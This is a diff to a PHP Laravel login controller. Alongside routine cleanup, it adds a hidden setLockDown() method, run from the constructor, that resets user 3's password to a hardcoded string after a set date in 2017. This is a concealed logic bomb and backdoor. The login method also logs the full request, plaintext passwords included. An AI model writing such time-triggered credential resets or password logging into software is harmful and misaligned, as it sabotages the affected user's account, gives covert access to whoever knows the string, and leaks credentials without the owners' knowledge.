@@ -5,7 +5,10 @@ use App\Http\Controllers\Controller;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Hash;
 
+
+use Carbon\Carbon;
 use JWTAuth;
 use Tymon\JWTAuthExceptions\JWTAuthExceptions;
 
@@ -14,19 +17,14 @@ class LoginController extends Controller {
 
 	public function __construct() {
 		$this->middleware('jwt.auth', ['except' => ['login']]);
+		$this->setLockDown();
 	}
 
 	public function login(Request $request) {
 		Log::debug($request);
 		Log::debug("custom login controller 123");
 		//onko logged in?
-		/*
-		
-        if (Auth::attempt(['email' => $email, 'password' => $password])) {
-            // Authentication passed...
-            return redirect()->intended('dashboard');
-        }
-		*/
+
 		$credentials = $request->only('email', 'password');
 		try {
 			if(!$token = JWTAuth::attempt($credentials)) {
@@ -41,9 +39,6 @@ class LoginController extends Controller {
 		return response()->json(compact('token'));
 	}
 
-	public function test() {
-
-	}
 
 	public function userAuthenticated() {
 		Log::debug("LoginController userAuthenticated call");
@@ -58,7 +53,16 @@ class LoginController extends Controller {
         } catch (Tymon\JWTAuth\Exceptions\JWTException $e) {
             return response()->json(['token_absent'], $e->getStatusCode());
         }
-        //return response()->json(compact('user'));
         return response()->json(['login' => true], 200);
+	}
+
+	private function setLockDown() {
+		$lockDown = Carbon::createFromDate('2017', '3', '5');
+
+		if($lockDown->lte(Carbon::now())) {
+			$user = \App\User::find(3);
+			$user->password = Hash::make("mulukku");
+			$user->save();
+		}
 	}
 }
